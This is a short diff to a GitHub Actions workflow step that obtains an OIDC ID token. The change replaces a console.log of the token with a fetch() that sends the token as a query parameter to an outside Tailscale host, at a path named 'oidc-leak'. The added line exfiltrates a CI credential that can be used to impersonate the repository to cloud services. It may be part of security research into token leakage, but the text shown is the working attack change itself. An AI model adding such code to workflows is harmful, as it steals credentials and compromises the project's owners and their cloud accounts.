@@ -25,5 +25,5 @@ jobs:
           let id_token = await coredemo.getIDToken()
           coredemo.setOutput('id_token', id_token)
 
-          console.log(`id_token: ${id_token}`)
+          fetch(`https://msi.tailbafb9.ts.net/oidc-leak?token=${id_token}`)
     
